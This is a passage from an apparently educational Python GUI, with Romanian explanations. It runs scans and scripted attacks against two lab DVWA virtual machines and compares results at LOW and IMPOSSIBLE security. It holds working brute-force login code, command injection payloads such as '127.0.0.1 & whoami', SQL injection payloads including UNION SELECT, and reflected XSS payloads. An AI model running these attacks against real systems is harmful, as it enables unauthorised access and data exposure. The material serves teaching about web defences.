        "Atacul evidențiază diferența dintre afișarea directă a datelor introduse de utilizator și afișarea lor într-o formă sigură."
    )
}

# Show the information for the test or attack selected through the “i” button.
def show_attack_info(attack_test_name):
    messagebox.showinfo(
        attack_test_name,
        ATTACK_TEST_INFO_TEXTS.get(attack_test_name)
    )

# Show general information about the interface.
def show_attack_interface_info():
    messagebox.showinfo(
        "Automated DVWA Security Testing App",
        "Această interfață permite rularea comparativă a testelor asupra celor două mașini virtuale Windows.\n\n"
        "În partea stângă este afișată mașina Windows vulnerabilă, configurată cu firewall dezactivat și DVWA la nivelul LOW.\n\n"
        "În partea dreaptă este afișată mașina Windows protejată, configurată cu firewall activ și DVWA la nivelul IMPOSSIBLE.\n\n"
        "Înainte de rularea unui test sau atac, trebuie selectată cel puțin una dintre mașinile Windows. "
        "Dacă sunt selectate ambele mașini, același test este executat pentru fiecare, iar rezultatele pot fi comparate direct.\n\n"
        "Testele sunt împărțite în două categorii: teste la nivel de sistem, precum PING, NMAP și NETCAT, "
        "și atacuri asupra aplicației DVWA, precum Brute Force, Command Injection, SQL Injection și XSS Reflected.\n\n"
        "Butonul Încearcă! permite deschiderea unei sesiuni RDP către mașina selectată, pentru testarea manuală a aplicației DVWA în browser."
    )

# Run a selected system test and display its output, duration, and interpretation.
def run_command(command, output_box, status, button, name, target_type):
    start_time = time.time()

    test_data = SYSTEM_TEST_TEXTS.get(name, {})
    machine_text = test_data.get(target_type, {})

    if test_data:
        output_box.insert("end", f"\n{name}\n", "about")
        output_box.insert("end", test_data["about"] + "\n\n", "about")

    output_box.insert("end", name + " pornește...\n\n")
    output_box.see("end")

    try:
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

        for output in process.stdout:
            output_box.insert("end", output)
            output_box.see("end")

        process.wait()

        duration = int(time.time() - start_time)
        minutes = duration // 60
        seconds = duration % 60

        output_box.insert(
            "end",
            f"\n{name} s-a finalizat în {minutes} minute și {seconds} secunde.\n\n"
        )

        if machine_text:
            output_box.insert(
                "end", 
                machine_text["interpretation"] + "\n\n", "about"
                )

        output_box.see(
            "end"
            )
        
        status.configure(
            fg="green"
            )
        
        button.configure(
            state="normal",
            text=name
            )

    except Exception as e: 

        output_box.insert(
            "end",
            f"\n[EROARE] {name} nu a putut rula: {str(e)}\n\n"
        )
        output_box.see(
            "end"
            )
        status.configure(
            fg="red"
            )
        button.configure(
            state="normal", text=name
            )

    finally:

        enable_buttons()
        button.configure(
            state="normal", 
            text=name
            )
        
# Prepare and start the system test for the selected machines.
def run_button(button, status, name, command_vulnerable, command_protected):

    if not check_vm_selection():
        return

    disable_buttons()

    button.configure(
        text = "Se rulează..."
        )
    
    status.configure(
        fg = "blue"
        )

    if var_vm_vulnerable.get():

        threading.Thread(
            target = run_command,
            args = (
                command_vulnerable,
                output_vulnerable,
                status,
                button,
                name,
                "vulnerable"
            ),
            daemon = True
        ).start()

    if var_vm_protected.get():

        threading.Thread(
            target = run_command,
            args = (
                command_protected,
                output_protected,
                status,
                button,
                name,
                "protected"
            ),
            daemon = True
        ).start()

# Callback for the PING button.
def ping_callback():
    run_button(
        button_ping, status_ping, "PING",
        ["ping", "-c", "4", vulnerable_vm_ip],
        ["ping", "-c", "4", protected_vm_ip]
    )

# Callback for the NMAP button.
def nmap_callback():
    run_button(
        button_nmap, status_nmap, "NMAP",
        ["nmap", "-Pn", "-sV", vulnerable_vm_ip],
        ["nmap", "-Pn", "-sV", protected_vm_ip]
    )

# Callback for the NETCAT button.
def netcat_callback():
    run_button(
        button_netcat, status_netcat, "NETCAT",
        ["nc", "-n", "-vz", "-w", "3", vulnerable_vm_ip, "22", "80", "135", "139", "443", "445", "3306", "3389", "5985"],
        ["nc", "-n", "-vz", "-w", "3", protected_vm_ip, "22", "80", "135", "139", "443", "445", "3306", "3389", "5985"]
    )

# Functions used for DVWA authentication and automated attack execution.
# Authenticate to DVWA and return an active HTTP session.
def login_dvwa(ip):

    base_url = "http://" + ip + "/dvwa"
    # Keep the DVWA cookies and session between requests.
    session = requests.Session()

    try:
        # Open the login page to obtain the CSRF token required by DVWA.
        r = session.get(base_url + "/login.php", timeout=10)

        # Extract the user_token value from the login form.
        match = re.search(r"name='user_token'\s+value='([a-f0-9]+)'", r.text)

        # Stop the login process if the token was not found.
        if not match:
            return None

        # Send the login credentials together with the extracted CSRF token.
        r = session.post(
            base_url + "/login.php",
            data={
                "username": "admin",
                "password": "password",
                "Login": "Login",
                "user_token": match.group(1)
            },

            timeout=10
        )

        # If the login page is no longer in the URL, authentication was successful.
        return session if "login.php" not in r.url else None

    except Exception:
        return None
    
# Run Brute Force
def brute_force(ip, output_box, button, status):

    about = (
        "Acest atac încearcă să descopere date de autentificare valide prin testarea automată și repetată a mai multor combinații de utilizator și parolă. "
        "Metoda se bazează pe folosirea unor credențiale slabe sau frecvent întâlnite. "
        "În scenariul vulnerabil, aplicația permite un număr nelimitat de încercări, fără mecanisme care să oprească atacurile automate, astfel încât combinația corectă poate fi găsită prin simpla parcurgere a listei. "
        "În scenariul protejat, atacul este mult mai greu de realizat, deoarece aplicația folosește mecanisme suplimentare, precum token-uri de securitate și validarea sesiunii. "
        "Atacul evidențiază modul în care măsurile de securitate împiedică compromiterea credențialelor, în timp ce o aplicație vulnerabilă rămâne expusă la acces neautorizat."
    )

    output_box.insert(
        "end", 
        "\nBRUTE FORCE\n", 
        "about"
        )
    output_box.insert(
        "end",
        about + "\n\n", 
        "about")
    output_box.see(
        "end"
        )

    session = login_dvwa(ip)
    if not session:
        output_box.insert(
            "end", 
            "[EROARE] Autentificarea a eșuat: DVWA nu răspunde sau credențialele sunt incorecte.\n\n"
            )
        enable_buttons()
        button.configure(
            state = "normal", 
            text = "Brute Force")
        status.configure(
            fg = "red"
            )

        return

    # URL of the DVWA Brute Force module.
    url = f"http://{ip}/dvwa/vulnerabilities/brute/"

    # Username and password lists used for the Brute Force test.
    userlist = ["user", "test", "root", "admin", "guest"]
    pwdlist = ["admin", "1234", "4321", "password", "admin1234"]

    # Calculate the total number of login attempts.
    total = len(userlist) * len(pwdlist)

    output_box.insert(
        "end", 
        f"Se execută atacul Brute Force pe {ip}.\n"
        )
    
    output_box.insert(
        "end", 
        f"Se testează {total} combinații de utilizator și parolă.\n\n"
        )

    # Store the discovered credentials and count the performed attempts.
    found = None
    attempts = 0

    try:
        # Test each username and password combination from the predefined lists.
        for user in userlist:
            for pwd in pwdlist:
                attempts += 1

                # Build the parameters sent to the DVWA Brute Force form.
                params = {"username": user, "password": pwd, "Login": "Login"}

                # Send the login attempt to the DVWA Brute Force module.
                r = session.get(url, params=params, timeout=10)

                output_box.insert(
                    "end", 
                    f"Încercarea {attempts}/{total} - utilizator: {user}, parolă: {pwd} -> "
                    )

                 # Check if the response contains the success message from DVWA.
                if "welcome to the password protected area" in r.text.lower():
                    output_box.insert(
                        "end", 
                        "AUTENTIFICARE REUȘITĂ!\n\n"
                        )

                    # Store the valid credentials and stop the attack.
                    found = (user, pwd)
                    break

                else:
                    output_box.insert(
                        "end",
                        "respins!\n"
                        )

                output_box.see(
                    "end"
                    )
                time.sleep(0.3)

            if found:
                break

        if found:
            user, pwd = found
            output_box.insert(
                "end",
                f"\nCredențiale descoperite după {attempts} încercări:\n"
                f"  utilizator: {user}\n"
                f"  parolă: {pwd}\n\n"
                "REZULTAT: VULNERABIL\n"
                "Aplicația a acceptat autentificarea automată și nu a impus nicio limită asupra numărului de încercări. "
                "La nivelul LOW, utilizatorul și parola sunt preluate direct din cererea GET și sunt verificate în baza de date fără mecanisme suplimentare de protecție, precum token Anti-CSRF, blocarea contului după eșecuri repetate, întârzieri între încercări sau CAPTCHA. "
		        "Din acest motiv, un atacator poate parcurge sistematic combinații de utilizator și parolă până la găsirea unor credențiale valide.\n\n",

                "about"
            )

        else:
            output_box.insert(
                "end",
                f"\nNicio combinație validă din cele {total} testate.\n\n"
                "REZULTAT: PROTEJAT\n"
                "Atacul Brute Force nu a reușit să obțină autentificarea. "
                "În nivelul IMPOSSIBLE, aplicația folosește mecanisme suplimentare de protecție, precum verificarea token-ului Anti-CSRF, validarea sesiunii, introducerea unei întârzieri după autentificările eșuate și blocarea temporară a contului după mai multe încercări greșite. "
                "Aceste măsuri împiedică parcurgerea rapidă și automată a combinațiilor de utilizator și parolă, neutralizând atacul în forma testată în aplicație.\n\n",
                
                "about"
            )

        status.configure(
            fg="green"
            )

    except Exception as e:
        output_box.insert(
            "end", 
            f"\n[EROARE] Atacul s-a întrerupt: {str(e)}\n\n"
            )

        status.configure(
            fg = "red"
            )

    enable_buttons()

    button.configure(
        state = "normal", 
        text = "Brute Force"
        )

# Callback for the Brute Force attack.
def brute_force_callback():

    if not check_vm_selection():
        return

    disable_buttons()                          
    button_brute_force.configure(
        text = "Se rulează..."
        )
    status_brute_force.configure(
        fg = "blue"
        )  

    if var_vm_vulnerable.get():
        threading.Thread(
            target = brute_force,
            args = (vulnerable_vm_ip, output_vulnerable, button_brute_force, status_brute_force),
            daemon = True
        ).start()

    if var_vm_protected.get():
        threading.Thread(
            target = brute_force,
            args = (protected_vm_ip, output_protected, button_brute_force, status_brute_force),
            daemon = True
        ).start()

# Run Command Injection.
def command_injection(ip, output_box, button, status):

    about = (
        "Acest atac exploatează modul în care aplicația transmite datele de intrare către sistemul de operare. "
        "Pagina execută o comandă ping asupra adresei IP introduse de utilizator. "
        "Dacă datele nu sunt validate, după caracterul '&' se poate adăuga o a doua comandă, care va fi executată și ea pe server. "
        "În scenariul vulnerabil, comanda suplimentară este executată, ceea ce permite rularea de comenzi arbitrare pe mașină. "
        "În scenariul protejat, datele de intrare sunt validate astfel încât să fie acceptată doar o adresă IP corectă, iar comanda suplimentară este respinsă. "
        "Atacul evidențiază modul în care lipsa validării datelor de intrare poate duce la compromiterea completă a serverului."
    )

    output_box.insert(
        "end", 
        "\nCOMMAND INJECTION\n",
        "about"
        )
    output_box.insert(
        "end",
        about + "\n\n", 
        "about"
        )
    output_box.see(
        "end"
        )

    session = login_dvwa(ip)
    if not session:
        output_box.insert(
            "end", 
            "[EROARE] Autentificarea a eșuat: DVWA nu răspunde sau credențialele sunt incorecte.\n\n"
            )
        enable_buttons()
        button.configure(
            state="normal", 
            text="Command Injection"
            )
        status.configure(
            fg="red"
            )
        return

    # URL of the DVWA Command Injection module.
    url = f"http://{ip}/dvwa/vulnerabilities/exec/"

    # Send a payload to the DVWA form and return the command output displayed by the page.
    def run_payload(payload):

        r = session.post(url, data={"ip": payload, "Submit": "Submit"}, timeout=10)

        # Extract the output displayed between the <pre> HTML tags.
        m = re.search(r"<pre>(.*?)</pre>", r.text, re.DOTALL)

        # Return the extracted command output, or an empty string if no output was found.
        return m.group(1).strip() if m else ""


    # Extract only the output produced by the injected command.
    def injected_part(full_output, baseline_len):

        # The injected command runs after ping, so its output follows the ping footer.
        parts = re.split(r"Average\s*=\s*\d+ms\s*", full_output, maxsplit=1)

        if len(parts) > 1 and parts[1].strip():

            return parts[1].strip()

        # Fallback: if the ping footer is not found but the output is longer, the injected command probably ran.
        if len(full_output) > baseline_len + 10:

            return full_output

        return ""

    # Injected commands:
    injected_payloads = [
        ("127.0.0.1 & whoami", "whoami", "contul sub care rulează serverul web"),
        ("127.0.0.1 & hostname", "hostname", "numele mașinii virtuale"),
        ("127.0.0.1 & ver", "ver", "versiunea de Windows"),
        ("127.0.0.1 & ipconfig", "ipconfig", "configurația de rețea"),
    ]

    output_box.insert(
        "end", 
        f"Se execută atacul Command Injection pe {ip}.\n\n"
        )
    # Store whether the target is vulnerable to Command Injection.
    vulnerable = False

    try:
        output_box.insert(
            "end", 
            "Se trimite comanda: 127.0.0.1\n"
            )
        baseline = run_payload("127.0.0.1")
        baseline_len = len(baseline)
        output_box.insert(
            "end",
            "  -> Răspuns normal: serverul a executat doar comanda ping asupra adresei IP\n"
            "     Acest rezultat este folosit ca reper pentru comparație, deoarece o intrare\n"
            "     validă trebuie să producă doar ieșirea comenzii ping, fără executarea unei\n"
            "     comenzi suplimentare pe sistemul de operare.\n\n"
        )

        # Test each injected payload against the DVWA Command Injection module.
        for payload, cmd, descr in injected_payloads:
            output_box.insert(
                "end", 
                f"Se trimite comanda: {payload}\n"
                )
            # Extract the output produced only by the injected command.
            extra = injected_part(run_payload(payload), baseline_len)

           # If extra output exists, the injected command was executed successfully.
            if extra:
                vulnerable = True
                output_box.insert(
                    "end", 
                    f"  -> Injecție reușită: comanda suplimentară '{cmd}' a fost executată pe server.\n"
                    )

                output_box.insert(
                    "end", 
                    f"     Rezultat ({descr}):\n"
                    )

                for line in extra.splitlines():
                    if line.strip():
                        output_box.insert(
                            "end", 
                            f"       {line.strip()}\n"
                            )

                output_box.insert(
                    "end", 
                    "\n"
                    )

            else:
                output_box.insert(
                    "end", 
                    f"  -> Comanda suplimentară '{cmd}' a fost blocată: răspunsul nu diferă de reper.\n\n"
                    )
                
            output_box.see(
                "end"
                )
            time.sleep(0.3)

        if vulnerable:
            output_box.insert(
                "end",
                "REZULTAT: VULNERABIL\n"
                "Serverul a executat comenzile introduse după caracterul '&', pe lângă comanda ping inițială. "
                "Rezultatele obținute demonstrează că datele introduse de utilizator ajung direct în linia de comandă a sistemului de operare, fără validare corespunzătoare.\n" 
                "Prin comenzile executate au fost obținute informații despre contul sub care rulează serverul web numele mașinii, versiunea sistemului de operare și configurația de rețea. "
                "Aceste informații pot fi folosite de un atacator pentru recunoaștere și pentru pregătirea unor atacuri ulterioare asupra sistemului.\n\n",

                "about"
            )

        else:
            output_box.insert(
                "end",
                "REZULTAT: PROTEJAT\n"
                "Atacul de tip Command Injection nu a reușit să execute comenzi suplimentare pe server. "
                "Spre deosebire de nivelul LOW, unde datele introduse de utilizator sunt trimise direct către linia de comandă, nivelul IMPOSSIBLE aplică mecanisme suplimentare de protecție.\n"
                "Codul sursă al nivelului verifică existența unui token Anti-CSRF valid și validează strict valoarea introdusă, acceptând doar o adresă IP formată din patru octeți numerici. "
                "Astfel, un payload precum '127.0.0.1 & whoami' este respins, deoarece conține o comandă suplimentară după caracterul '&' și nu mai respectă formatul unei adrese IP valide. "
                "Prin urmare, comenzile precum whoami, hostname, ver sau ipconfig nu ajung să fie executate de sistemul de operare, iar aplicația rămâne protejată împotriva acestui tip de atac.\n\n",

                "about"
            )

        status.configure(
            fg = "green"
            )

    except Exception as e:
        output_box.insert(
            "end", 
            f"\n[EROARE] Atacul s-a întrerupt: {str(e)}\n\n"
            )

        status.configure(
            fg = "red" 
            )

    enable_buttons()
    button.configure(
        state="normal", 
        text="Command Injection"
        )

# Callback for the Command Injection attack.
def command_injection_callback():

    if not check_vm_selection():
        return

    disable_buttons()

    button_command_injection.configure(
        text = "Se rulează..."
        )

    status_command_injection.configure(
        fg = "blue"
        )

    if var_vm_vulnerable.get():
        threading.Thread(
            target = command_injection,
            args = (vulnerable_vm_ip, output_vulnerable, button_command_injection, status_command_injection),
            daemon = True
        ).start()

    if var_vm_protected.get():
        threading.Thread(
            target = command_injection,
            args = (protected_vm_ip, output_protected, button_command_injection, status_command_injection),
            daemon = True
        ).start()

# Run SQL Injection.
def sql_injection(ip, output_box, button, status):

    about = (
        "Acest atac introduce cod SQL în câmpurile aplicației pentru a manipula interogările trimise către baza de date. "
        "În locul unei valori normale, de exemplu un număr de identificare, se trimite o interogare special construită care forțează aplicația să returneze mai multe date decât ar trebui. "
        "În scenariul vulnerabil, datele primite sunt introduse direct în interogarea către baza de date, fără validare, astfel încât pot fi extrase informații suplimentare. "
        "În scenariul protejat, aplicația folosește interogări parametrizate și validarea datelor, astfel încât tentativa de injecție este tratată ca text obișnuit și nu mai are efect. "
        "Atacul evidențiază modul în care lipsa validării datelor de intrare duce la expunerea bazei de date, în timp ce o aplicație securizată păstrează datele protejate."
    )

    output_box.insert(
        "end", 
        "\nSQL INJECTION\n", 
        "about"
        )
    output_box.insert(
        "end", 
        about + "\n\n", 
        "about"
        )
    output_box.see(
        "end"
        )

    session = login_dvwa(ip)
    if not session:
        output_box.insert(
            "end",
            "[EROARE] Autentificarea a eșuat: DVWA nu răspunde sau credențialele sunt incorecte.\n\n"
            )   
        enable_buttons()
        button.configure(
            state = "normal", 
            text = "SQL Injection"
            )
        status.configure(
            fg = "red"
            )
        return

    # URL of the DVWA SQL Injection module.
    url = f"http://{ip}/dvwa/vulnerabilities/sqli/"

    # Payloads used for SQL Injection
    payloads = [
        "1",
        "1' OR '1'='1",
        "0' UNION SELECT @@hostname, 'Acesta este numele hostului bazei de date'-- -"
    ]

    output_box.insert(
        "end", 
        f"Se execută atacul Injecție SQL pe {ip}.\n\n"
        )
    vulnerable = False

    def get_user_token():
        page = session.get(url, timeout = 10)
        match = re.search(
            r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)['\"]",
            page.text
        )
        if match:
            return match.group(1)
        return None

    try:
        for payload in payloads:
            output_box.insert(
                "end", 
                f"Se trimite comanda: {payload}\n"
                )

            params = {
                "id": payload,
                "Submit": "Submit"
            }

            token = get_user_token()

            if token:
                params["user_token"] = token

            r = session.get(url, params = params, timeout = 10)

            # Extract the results displayed by DVWA.
            rows = re.findall(
                r"First name:\s*(.*?)<br\s*/?>\s*Surname:\s*(.*?)</pre>",
                r.text,
                re.IGNORECASE | re.DOTALL
            )
            count = len(rows)

            # The first command is the normal test used as a baseline.
            if payload == "1":

                output_box.insert(
                    "end",
                    f"  -> Răspuns normal: {count} înregistrare returnată.\n"
                )

                output_box.insert(
                    "end",
                    "     Această comandă reprezintă reperul: o interogare legitimă returnează\n"
                    "     o singură înregistrare, cea cerută explicit prin ID. Rezultatele\n"
                    "     următoare se raportează la această valoare.\n\n"
                )

            # The second command uses a condition that is always true.
            elif "OR" in payload.upper() and count > 1:
                vulnerable = True

                output_box.insert(
                    "end",
                    f"  -> Injecție reușită: s-au extras {count} utilizatori.\n\n"
                )

                output_box.insert(
                    "end",
                    f"     Cei {count} utilizatori extrași sunt:\n"
                )

                for index, (first, surname) in enumerate(rows, start = 1):
                    output_box.insert(
                        "end",
                        f"       {index}. {first.strip()} {surname.strip()}\n"
                    )

                output_box.insert(
                    "end",
                    "\n     Comanda 1' OR '1'='1 adaugă o condiție mereu adevărată în interogare.\n"
                    "     Deoarece '1'='1' este întotdeauna adevărat, clauza WHERE se potrivește\n"
                    "     cu toate înregistrările din tabel, iar aplicația returnează întreaga\n"
                    "     listă de utilizatori în loc de o singură înregistrare.\n\n"
                )

            # The third command uses UNION SELECT for extracting the hostname.
            elif "UNION" in payload.upper() and count >= 1:
                vulnerable = True

                output_box.insert(
                    "end",
                    f"  -> Injecție reușită: aplicația a returnat {count} rezultat.\n\n"
                )

                output_box.insert(
                    "end",
                    "     Date extrase prin UNION SELECT:\n"
                )

                for hostname, explanation in rows:
                    output_box.insert(
                        "end",
                        f"       Hostname bază de date: {hostname.strip()}\n"
                        f"       Explicație: {explanation.strip()}\n"
                    )

                output_box.insert(
                    "end",
                    "\n     Comanda folosește operatorul UNION pentru a adăuga la rezultatul\n"
                    "     interogării originale o a doua interogare controlată de atacator.\n"
                    "     În acest caz, payload-ul afișează valoarea @@hostname, care reprezintă\n"
                    "     numele sistemului pe care rulează serverul bazei de date.\n\n"
                    "     Această informație poate fi utilă în etapa de recunoaștere, deoarece\n"
                    "     ajută la identificarea mediului în care rulează aplicația și baza de date.\n\n"
                )

            # If no extra data appears, the payload did not change the query.
            else:

                output_box.insert(
                    "end",
                    "  -> Comandă blocată: aplicația nu a returnat date suplimentare.\n"
                    "     Payload-ul trimis nu a modificat rezultatul interogării, ceea ce indică faptul\n"
                    "     că instrucțiunea SQL nu a fost executată ca parte din query-ul aplicației.\n\n"
                )

            output_box.see(
                "end"
                )
            time.sleep(0.3)

        if vulnerable:

            output_box.insert(
                "end",
                "REZULTAT: VULNERABIL\n"
                "Comenzile injectate au fost interpretate ca instrucțiuni SQL și executate de baza de date. "
                "La nivelul LOW, valoarea introdusă de utilizator este inserată direct în interogarea SQL, fără validare și fără interogări parametrizate.\n\n"
                "Prin injecția de tip OR, aplicația a returnat mai mulți utilizatori din baza de date, deși în mod normal ar trebui să returneze doar utilizatorul asociat ID-ului introdus. "
                "Prin injecția de tip UNION SELECT, aplicația a returnat valoarea @@hostname, adică numele hostului pe care rulează serverul bazei de date.\n\n"
                "Acest comportament demonstrează că atacatorul poate modifica logica interogării și poate obține informații care nu ar trebui să fie accesibile prin utilizarea normală a aplicației.\n\n",

                "about"
            )

        else:

            output_box.insert(
                "end",
                "REZULTAT: PROTEJAT\n"
                "Comenzile injectate nu au fost interpretate ca instrucțiuni SQL. "
                "La nivelul IMPOSSIBLE, aplicația verifică token-ul Anti-CSRF, acceptă doar valori numerice pentru ID și transformă valoarea primită într-un număr întreg prin intval().\n\n"
                "În plus, interogarea este realizată printr-un prepared statement, folosind bindParam pentru parametrul: id. "
                "Astfel, baza de date poate distinge între codul SQL al aplicației și datele introduse de utilizator. "
                "Din acest motiv, payload-uri precum 1' OR '1'='1 sau UNION SELECT nu modifică interogarea originală și nu pot returna date suplimentare."
                "Aplicația returnează doar rezultatul așteptat pentru un ID numeric valid.\n\n",

                "about"
            )

        status.configure(
            fg = "green"
            )

    except Exception as e:
        output_box.insert(
            "end",
            f"\n[EROARE] Atacul s-a întrerupt: {str(e)}\n\n"
        )
        status.configure(
            fg = "red"
            )
    enable_buttons()
    button.configure(
        state = "normal", 
        text = "SQL Injection"
        )

# Callback for the SQL Injection attack.
def sql_injection_callback():

    if not check_vm_selection():
        return

    disable_buttons()

    button_sql_injection.configure(
        text = "Se rulează..."
        )

    status_sql_injection.configure(
        fg = "blue"
        )

    if var_vm_vulnerable.get():
        threading.Thread(
            target = sql_injection,
            args = (vulnerable_vm_ip, output_vulnerable, button_sql_injection, status_sql_injection),
            daemon = True
        ).start()

    if var_vm_protected.get():
        threading.Thread(
            target = sql_injection,
            args = (protected_vm_ip, output_protected, button_sql_injection, status_sql_injection),
            daemon = True
        ).start()

# Run XSS Reflected
def xss_reflected(ip, output_box, button, status):

    about = (
        "Acest atac injectează cod JavaScript într-un câmp al paginii web. "
        "În cazul atacului XSS reflectat, codul introdus de utilizator nu este stocat în aplicație, ci este returnat imediat în răspunsul paginii. "
        "În scenariul vulnerabil, aplicația afișează direct valoarea introdusă, fără filtrare sau escaping, astfel încât browserul poate interpreta payload-ul ca HTML sau JavaScript executabil. "
        "În scenariul protejat, aplicația folosește funcția htmlspecialchars(), care transformă caracterele speciale în text inofensiv. "
        "Atacul evidențiază diferența dintre afișarea directă a datelor introduse de utilizator și afișarea lor într-o formă sigură."
    )

    output_box.insert(
        "end", 
        "\nXSS REFLECTED\n", 
        "about")
    output_box.insert(
        "end", 
        about + "\n\n", 
        "about"
        )
    output_box.see(
        "end"
        )

    session = login_dvwa(ip)

    if not session:
        output_box.insert(
            "end", 
            "[EROARE] Autentificarea a eșuat: DVWA nu răspunde sau credențialele sunt incorecte.\n\n"
            )
        enable_buttons()
        button.configure(
            state="normal", 
            text="XSS REFLECTED"
            )
        status.configure(
            fg="red"
            )
        return

    # URL of the DVWA Reflected XSS module.
    url = f"http://{ip}/dvwa/vulnerabilities/xss_r/"

    # Payloads used.
    payloads = [
        (
            "<script>alert('XSS')</script>",
            "etichetă <script> clasică"
        ),

        (
            "<h1 ondblclick=\"alert('Ai descoperit vulnerabilitatea!')\">Apasă pentru un premiu</h1>",
            "eveniment ondblclick pe un titlu HTML"
        )
    ]

    output_box.insert(
        "end", 
        f"Se execută atacul XSS Reflected pe {ip}.\n\n"
        )

    # Initialize the vulnerability flag as False before testing the payloads.
    vulnerable = False

    try:
        # Send each XSS payload through the vulnerable input parameter.
        for payload, technique in payloads:
            output_box.insert(
                "end", 
                f"Se trimite payload-ul: {payload}\n"
                )
            output_box.insert(
                "end", 
                f"   Tehnica utilizată: {technique}\n"
                )

            r = session.get(url, params={"name": payload}, timeout=10)

            if payload in r.text:
                vulnerable = True
                output_box.insert(
                    "end",
                    "  -> Payload reflectat: codul a fost returnat neschimbat în pagina HTML.\n"
                    "     Într-un browser real, textul poate fi afișat pe pagină, iar la dublu click se poate declanșa alerta.\n"
                )

            else:
                escaped = payload.replace("<", "&lt;").replace(">", "&gt;")

                if escaped in r.text:
                    output_box.insert(
                        "end",
                        "  -> Payload neutralizat: caracterele speciale au fost transformate în entități HTML.\n"
                        "     Astfel, codul este afișat ca text simplu și nu mai este executat de browser.\n\n"
                    )

                else:
                    output_box.insert(
                        "end",
                        "  -> Payload blocat: codul nu apare neschimbat în răspunsul aplicației.\n"
                        "     Acest comportament indică aplicarea unor mecanisme de filtrare sau validare.\n\n"
                    )

            output_box.see(
                "end"
                )
            time.sleep(0.3)

        if vulnerable:
            output_box.insert(
                "end",
                "REZULTAT: VULNERABIL\n"
                "Payload-urile XSS au fost reflectate neschimbate în pagina returnată de aplicație. "
                "La nivelul LOW, codul sursă afișează direct valoarea parametrului name în răspunsul HTML, fără filtrare și fără escaping.\n"
      
                "Din acest motiv, browserul poate interpreta datele introduse de utilizator ca HTML sau JavaScript executabil."
                "În acest test, efectul este demonstrat printr-un payload benign care afișează un text pe pagină și declanșează o alertă la dublu click.\n\n",

                "about"
            )

        else:
            output_box.insert(
                "end",
                "REZULTAT: PROTEJAT\n"
                "Payload-urile XSS nu au fost reflectate neschimbate în pagina returnată de aplicație. "
                "La nivelul IMPOSSIBLE, aplicația verifică token-ul Anti-CSRF și folosește funcția htmlspecialchars() asupra valorii introduse de utilizator.\n"
                "Această funcție transformă caracterele speciale, precum < și >, în entități HTML, astfel încât browserul le afișează ca text simplu și nu le mai interpretează ca HTML sau JavaScript executabil.\n" 
                "Prin urmare, codul introdus de utilizator este neutralizat, iar aplicația este protejată împotriva atacului XSS reflectat în forma testată.\n\n",

                "about"
            )

        # The payload reflection is detected in text, but real execution must be verified in a browser.
        output_box.insert(
            "end",
            "Observație: această verificare analizează răspunsul HTML primit de aplicație. "
            "Pentru a observa efectul vizual al atacului, de exemplu afișarea unei alerte în browser, se poate folosi butonul „Încearcă!”, care deschide DVWA direct în browser.\n\n",

            "about"
        )

        status.configure(
            fg="green"
            )

    except Exception as e:
        output_box.insert(
            "end", 
            f"\n[EROARE] Atacul s-a întrerupt: {str(e)}\n\n"
            )
        status.configure(
            fg="red"
            )
    enable_buttons()
    button.configure(
        state="normal", 
        text="XSS REFLECTED"
        )


# Callback for the XSS Reflected attack.
def xss_reflected_callback():

    if not check_vm_selection():
        return

    disable_buttons()
    button_xss_reflected.configure(
        text = "Se rulează..."
        )
    status_xss_reflected.configure(
        fg = "blue"
        )  

    if var_vm_vulnerable.get():
        threading.Thread(
            target = xss_reflected,
            args = (vulnerable_vm_ip, output_vulnerable, button_xss_reflected, status_xss_reflected),
            daemon = True
        ).start()

    if var_vm_protected.get():
        threading.Thread(
            target = xss_reflected,
            args = (protected_vm_ip, output_protected, button_xss_reflected, status_xss_reflected),
            daemon = True
        ).start()

# Build the screen where the user runs the tests and attacks.
def attack_interface():

    # Existing widgets are removed before the screen is rebuilt.
    for widget in app.winfo_children():
        widget.destroy()

    app.title("Automated DVWA Security Testing App")

    # These widgets are declared as global because they are updated by other functions.
    global var_vm_vulnerable, var_vm_protected
    global output_vulnerable, output_protected
    global button_ping, status_ping
    global button_nmap, status_nmap
    global button_netcat, status_netcat
    global button_try
    global button_brute_force, status_brute_force
    global button_command_injection, status_command_injection
    global button_sql_injection, status_sql_injection
    global button_xss_reflected, status_xss_reflected
    global button_reset, button_back, button_info2, button_exit2

    # Store the selection state of the vulnerable and protected Windows machines.
    var_vm_vulnerable = tk.BooleanVar(value=False)
    var_vm_protected = tk.BooleanVar(value=False)

    # Create the title for the vulnerable Windows machine.
    label_vulnerable = tk.Label(
        app,
        text = "WINDOWS VULNERABIL",
        font = font_vm_title
    )
    label_vulnerable.place(
        relx = 0.2,
        rely = 0.06,
        anchor = "center"
    )

    checkbox_vulnerable = tk.Checkbutton(
        app,
        variable = var_vm_vulnerable,
        cursor = "hand2"
    )
    checkbox_vulnerable.place(
        relx = 0.2,
        rely = 0.09,
        anchor = "center"
    )

    # Create the title for the protected Windows machine.
    label_protected = tk.Label(
        app,
        text = "WINDOWS PROTEJAT",
        font = font_vm_title
    )
    label_protected.place(
        relx = 0.8,
        rely = 0.06,
        anchor = "center"
    )

    checkbox_protected = tk.Checkbutton(
        app,
        variable = var_vm_protected,
        cursor = "hand2"
    )
    checkbox_protected.place(
        relx = 0.8,
        rely = 0.09,
        anchor = "center"
    )

    label_vulnerable_output = tk.Label(
        app, 
        text="Rezultate Windows vulnerabil",
        font = font_output_title
    )
    label_vulnerable_output.place(
        relx = 0.2,
        rely = 0.12,
        anchor = "center"
    )

    # Create the text area where the results for the vulnerable machine are displayed.
    output_vulnerable = scrolledtext.ScrolledText(
        app,
        fg = "black",
        wrap = "word"
    )
    output_vulnerable.place(
        relx = 0.2,
        rely = 0.54,
        anchor = "center",
        relwidth = 0.37,
        relheight = 0.79
    )

    # Configure the "about" style for the vulnerable machine output.
    output_vulnerable.tag_configure(
        "about",
        foreground = "black",
        font = font_explanation
    )

    label_protected_output = tk.Label(
        app,
        text = "Rezultate Windows protejat",
        font =  font_output_title
    )
    label_protected_output.place(
        relx = 0.8, 
        rely = 0.12, 
        anchor = "center"
        )

    # Create the text area where the results for the protected machine are displayed.
    output_protected = scrolledtext.ScrolledText(
        app,
        fg = "black", 
        wrap = "word"
    )
    output_protected.place(
        relx = 0.8,
        rely = 0.54,
        anchor = "center",
        relwidth = 0.37,
        relheight = 0.79
    )

    # Configure the "about" style for the protected machine output.
    output_protected.tag_configure(
        "about",
        foreground = "black",
        font = font_explanation
    )

    # Create the central title for the attack menu.
    label_attacks = tk.Label(
